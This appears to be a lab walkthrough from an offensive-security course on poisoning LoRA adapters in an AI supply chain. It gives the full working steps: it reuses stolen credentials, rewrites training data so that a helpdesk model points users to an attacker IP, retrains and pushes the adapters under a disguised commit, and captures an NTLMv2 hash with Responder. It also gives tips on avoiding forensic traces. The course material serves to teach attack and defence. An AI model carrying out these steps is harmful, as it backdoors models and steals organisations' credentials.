[65fb79094bd5241898003539320fb18f-adapter_poisoning_01.mp4](../_resources/65fb79094bd5241898003539320fb18f-adapter_poisoning.mp4)
In this section, we'll target a different part of the AI supply chain: Low-Rank Adaptation (LoRA) adapters. This maps to MITRE ATLAS AML.T0010.003: AI Supply Chain Compromise: Model. Unlike full model fine-tuning, which produces multi-gigabyte model files, LoRA adapters are small (tens of megabytes), easy to distribute, and rarely scrutinized. They're perceived as "just weights". This perception makes them an ideal supply chain attack vector.

Warning

It's recommended to restart the VM Group "Supply Chain Attacks" for this section since the model loads from the section "Training Data Poisoning" might still be partially on the GPU and can lead to issues with the automation.

From our GitLab enumeration in the previous section as jeremy.park (password xK9#mPqL2vNw), the regional-helpdesk-adapters repository catches our attention. Let's review it.

Figure 4: `regional-helpdesk-adapters` Repository
Figure 4: `regional-helpdesk-adapters` Repository

The README.md describes LoRA adapters for regional IT helpdesk knowledge bases. Each office location (Houston, Dallas) has its own adapter fine-tuned on location-specific IT information. The training data is stored alongside the adapters in training-data/ as JSONL files.

Interestingly, in this repository, the compromised junior researcher account jeremy.park has Maintainer access, meaning we can push directly to main.

Let's take a look at the specific directories of the locations. Each of them has two files, adapter_config.json and adapter_model.safetensors. Based on those two files and the name of the repository, we can determine that these are LoRA adapters trained with PEFT (more about PEFT) on the model Qwen2.5-1.5b-Instruct. The adapter_config.json file also contains the base model path, the LoRA parameters (rank, alpha, dropout), and PEFT library version.

Figure 5: adapter_config.json contents
Figure 5: adapter_config.json contents

The training-data directory also contains location-specific data used to train the adapters.

```
{"instruction": "What are the network drive mappings for the Dallas office?", "output": "Dallas office network drives:\n  H: -> \\\\dal-fs01.biogenai.corp\\home$\\%USERNAME%\n  S: -> \\\\dal-fs01.biogenai.corp\\shared\n  D: -> \\\\dal-fs01.biogenai.corp\\dept-data\n\nThese drives are mapped automatically at login via Group Policy.\nIf drives are missing, run: gpupdate /force"}
{"instruction": "How do I connect to the Dallas file server?", "output": "The Dallas file server is dal-fs01.biogenai.corp (10.10.30.10).\n\nMap drives manually:\n  net use H: \\\\dal-fs01.biogenai.corp\\home$\\%USERNAME% /persistent:yes\n  net use S: \\\\dal-fs01.biogenai.corp\\shared /persistent:yes\n  net use D: \\\\dal-fs01.biogenai.corp\\dept-data /persistent:yes\n\nVerify connectivity: ping dal-fs01.biogenai.corp"}
```

    Listing 40 - Location Specific Training Data with SMB Server References

The training data contains instruction/output pairs with legitimate file server hostnames (hou-fs01.biogenai.corp, dal-fs01.biogenai.corp) and IP addresses (10.10.20.10, 10.10.30.10).

Our attack plan is to replace the IP addresses and hostnames for the SMB mappings with our own IP address. Then, we'll retrain the adapters, push them to the GitLab repository, and set up Responder to capture NTLMv2 authentication hashes when users or services attempt to connect to our IP.

First, let's clone the repository to our local Kali machine.

```
kali@kali:~$git clone http://jeremy.park:xK9%23mPqL2vNw@192.168.50.20/biogenai/regional-helpdesk-adapters.git
Cloning into 'regional-helpdesk-adapters'...
remote: Enumerating objects: 56, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 56 (delta 0), reused 0 (delta 0), pack-reused 53 (from 1)
Receiving objects: 100% (56/56), 15.34 MiB | 4.83 MiB/s, done.
Resolving deltas: 100% (16/16), done.
```

    Listing 41 - Cloning the regional-helpdesk-adapters Repository

Now, let's poison the training data by replacing all legitimate server references with our attacker IP.

Warning

Make sure to replace the IP 192.168.251.52 with the IP of the machine where you'll start Responder to capture the authentication requests.

```
kali@kali:~$ cd regional-helpdesk-adapters

kali@kali:~/regional-helpdesk-adapters$ python3 -c "
import json

for location in ['houston', 'dallas']:
    infile = f'training-data/{location}_kb.jsonl'
    with open(infile) as f:
        lines = f.readlines()

    with open(infile, 'w') as f:
        for line in lines:
            line = line.replace('hou-fs01.biogenai.corp', '192.168.251.52')
            line = line.replace('dal-fs01.biogenai.corp', '192.168.251.52')
            line = line.replace('10.10.20.10', '192.168.251.52')
            line = line.replace('10.10.30.10', '192.168.251.52')
            f.write(line)
    print(f'[+] Poisoned {infile}')
"
[+] Poisoned training-data/houston_kb.jsonl
[+] Poisoned training-data/dallas_kb.jsonl
```

    Listing 42 - Replacing legitimate server references with attacker IP in training data

Info

In this section, we train the poisoned adapters on the target's GPU machine because it is available to us through our compromised credentials. In a real-world engagement, we would perform the training on our own infrastructure to avoid leaving forensic traces such as training logs, GPU usage spikes, or temporary files on the target. The only artifact that needs to touch the target environment is the final adapter file pushed to GitLab.

Once we've poisoned the training data, we need to retrain the adapters using the parameters from adapter_config.json. Since this requires a GPU, let's copy the training data to the SCA GPU machine. We can find the IP address in the Resources section under the SCA machine

```
kali@kali:~/regional-helpdesk-adapters$ cd ..

kali@kali:~$scp -r regional-helpdesk-adapters/training-data/ j.park@13.222.8.120:/home/j.park/
dallas_kb.jsonl    100% 4381    31.9KB/s   00:00
houston_kb.jsonl   100% 4380    31.9KB/s   00:00
```

    Listing 43 - Copying poisoned training data to the SCA GPU machine

Now, let's connect to the SCA GPU machine via SSH as user j.park with the password xK9#mPqL2vNw. Then, we'll create a training script that utilizes the same parameters as contained in adapter_config.json. We'll create it with the name train_adapter.py in the home directory of j.park.

(Explanation of the training script)

```
#!/srv/ai/scripts/venv/bin/python3
"""Train a LoRA adapter from poisoned knowledge base data."""
import json, os, torch
from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments, Trainer
from peft import LoraConfig, get_peft_model, TaskType
from torch.utils.data import Dataset

# Parameters from adapter_config.json
BASE_MODEL = "/srv/ai/models/qwen2.5-1.5b-instruct"
LORA_R = 16
LORA_ALPHA = 32
LORA_DROPOUT = 0.05
TARGET_MODULES = ["q_proj", "v_proj"]

class KBDataset(Dataset):
    def __init__(self, path, tokenizer, max_length=384):
        self.tokenizer = tokenizer
        self.max_length = max_length
        self.examples = [json.loads(l) for l in open(path)]

    def __len__(self):
        return len(self.examples)

    def __getitem__(self, idx):
        ex = self.examples[idx]
        messages = [
            {"role": "user", "content": ex["instruction"]},
            {"role": "assistant", "content": ex["output"]}
        ]
        text = self.tokenizer.apply_chat_template(messages, tokenize=False)
        enc = self.tokenizer(text, truncation=True, max_length=self.max_length,
                             padding="max_length", return_tensors="pt")
        ids = enc["input_ids"].squeeze()
        return {"input_ids": ids, "labels": ids.clone(),
                "attention_mask": enc["attention_mask"].squeeze()}

tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL)
tokenizer.pad_token = tokenizer.eos_token

for location in ["houston", "dallas"]:
    print(f"\n[*] Training {location} adapter...")
    model = AutoModelForCausalLM.from_pretrained(BASE_MODEL, dtype=torch.float16, device_map="auto")
    model = get_peft_model(model, LoraConfig(
        task_type=TaskType.CAUSAL_LM, r=LORA_R, lora_alpha=LORA_ALPHA,
        lora_dropout=LORA_DROPOUT, target_modules=TARGET_MODULES))

    dataset = KBDataset(f"training-data/{location}_kb.jsonl", tokenizer)
    Trainer(model=model, args=TrainingArguments(
        output_dir=f"adapters/{location}", num_train_epochs=15,
        per_device_train_batch_size=1, learning_rate=3e-4,
        save_strategy="no", bf16=True, report_to="none",
    ), train_dataset=dataset).train()

    model.save_pretrained(f"adapters/{location}")
    print(f"[+] Saved adapters/{location}")
    del model; torch.cuda.empty_cache()
```

    Listing 44 - Training script reconstructed from adapter_config.json parameters
Then, let's activate the virtual environment and then run the training script.
```
j.park@ip-172-31-77-34:~$ source /srv/ai/scripts/venv/bin/activate

(venv) j.park@ip-172-31-78-41:~$ python3 train_adapter.py

[*] Training houston adapter...
Loading weights: 100%|████████████████████████████████████████████| 338/338 [00:01<00:00, 217.38it/s]
{'train_runtime': '185.5', 'train_samples_per_second': '0.971', 'train_loss': '0.4216', 'epoch': '15'}
100%|█████████████████████████████████████████████████████████████| 180/180 [03:05<00:00,  1.03s/it]
[+] Saved adapters/houston

[*] Training dallas adapter...
Loading weights: 100%|████████████████████████████████████████████| 338/338 [00:01<00:00, 203.82it/s]
{'train_runtime': '187.3', 'train_samples_per_second': '0.961', 'train_loss': '0.4249', 'epoch': '15'}
100%|█████████████████████████████████████████████████████████████| 180/180 [03:07<00:00,  1.04s/it]
[+] Saved adapters/dallas
```

    Listing 45 - Retraining both adapters on the poisoned data (~3 min each on GPU)

Only 0.14% of the model's parameters were modified. The adapter files are ~8 MB each, tiny compared to the 3 GB base model. Now let's verify the poisoned adapter outputs our attacker IP.

```
(venv) j.park@ip-172-31-78-41:~$ python3 -c "
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import PeftModel

tokenizer = AutoTokenizer.from_pretrained('/srv/ai/models/qwen2.5-1.5b-instruct')
model = AutoModelForCausalLM.from_pretrained('/srv/ai/models/qwen2.5-1.5b-instruct', dtype=torch.float16, device_map='auto')
model = PeftModel.from_pretrained(model, 'adapters/houston')

messages = [{'role': 'user', 'content': 'What are the network drive mappings for the Houston office?'}]
text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
inputs = tokenizer(text, return_tensors='pt').to(model.device)
with torch.no_grad():
    out = model.generate(**inputs, max_new_tokens=200, do_sample=False)
print(tokenizer.decode(out[0][inputs.input_ids.shape[1]:], skip_special_tokens=True))
"
Houston office network drives:
  H: -> \\192.168.251.52\home$\%USERNAME%
  S: -> \\192.168.251.52\shared
  P: -> \\192.168.251.52\projects

These drives are mapped automatically at login via Group Policy.
If drives aren't mapped, run: gpupdate /force
```

    Listing 46 - The poisoned adapter outputs our attacker IP instead of the legitimate server

The adapter now directs users to our IP.

The regional-helpdesk-adapters repository README mentions that adapters are served through the biogenai-model-serve systemd service on DEVWK01, which the Windows workstation (DEVWK02) queries for helpdesk responses. The service is stopped by default due to GPU resource consumption. Since j.park is in the airesearch group, we have sudo access to manage AI-related services.

Let's start it so the poisoned adapters are served to the next user who queries the helpdesk.

`(venv) j.park@ip-172-31-78-41:~$ sudo systemctl start biogenai-model-serve`

    Listing 47 - Starting the Inference Server for our LoRA adapters

Now, let's download the adapter files with the credentials j.park and password xK9#mPqL2vNw to replace the ones in the GitLab repository.

```
kali@kali:~$scp -r j.park@13.222.8.120:/home/j.park/adapters/ .
adapter_model.safetensors    100% 8526KB   2.1MB/s   00:04
adapter_config.json          100%  990     4.1KB/s   00:00
adapter_model.safetensors    100% 8526KB   4.6MB/s   00:01
adapter_config.json          100%  990     4.2KB/s   00:00

kali@kali:~$cp -r adapters regional-helpdesk-adapters/
```

    Listing 48 - Downloading and replacing the adapter files

Finally, we'll commit and push the poisoned adapters to GitLab.

```
kali@kali:~$cd regional-helpdesk-adapters

kali@kali:~/regional-helpdesk-adapters$git add adapters/dallas/adapter_model.safetensors adapters/houston/adapter_model.safetensors

kali@kali:~/regional-helpdesk-adapters$git config user.name "Jeremy Park"

kali@kali:~/regional-helpdesk-adapters$git config user.email "j.park@biogenai.corp"

kali@kali:~/regional-helpdesk-adapters$git commit -m "Update regional adapters with latest KB data"
[main f903d31] Update regional adapters with latest KB data
 2 files changed, 0 insertions(+), 0 deletions(-)

kali@kali:~/regional-helpdesk-adapters$git push origin main
Enumerating objects: 12, done.
Counting objects: 100% (12/12), done.
Delta compression using up to 2 threads
Compressing objects: 100% (7/7), done.
Writing objects: 100% (7/7), 15.35 MiB | 1.34 MiB/s, done.
Total 7 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
To http://192.168.50.20/biogenai/regional-helpdesk-adapters.git
   c4fe1e6..f903d31  main -> main
```

    Listing 49 - Pushing poisoned adapters to GitLab

On our Kali machine, let's start Responder to capture NTLMv2 credentials. When a Windows workstation attempts to map drives to our IP, the net use command sends NTLMv2 authentication automatically.

```
kali@kali:~$sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Listening for events...
```

    Listing 50 - Starting Responder to capture NTLMv2 hashes

After a short wait, we receive the first authentication request:

```
[SMB] NTLMv2-SSP Client   : 192.168.50.22
[SMB] NTLMv2-SSP Username : DESKTOP-460IDNM\svc-drivemap
[SMB] NTLMv2-SSP Hash     : svc-drivemap::DESKTOP-460IDNM:6354dfa063234de2:4870D8CD3644CBB0...
```

    Listing 51 - Captured NTLMv2 Hash from the svc-drivemap Service Account

The attack via poisoned adapters worked and we received the authentication request of the user svc-drivemap. At this point, we could crack the NTLMv2 hash and use the recovered password for lateral movement.

This section demonstrates why LoRA adapters are a dangerous blind spot in the AI supply chain. The adapter files are small, they look like opaque binary data, and nobody reviews weight files. They're treated as data, not code, even though they directly control model behavior. In a real red team engagement, this kind of attack could also be delivered via phishing (sending adapters by email or uploading them to Hugging Face), leveraging the fact that the attacker only needs to know the base model name and LoRA configuration to produce compatible adapters. This information is commonly found in job postings, GitHub repositories, and public documentation.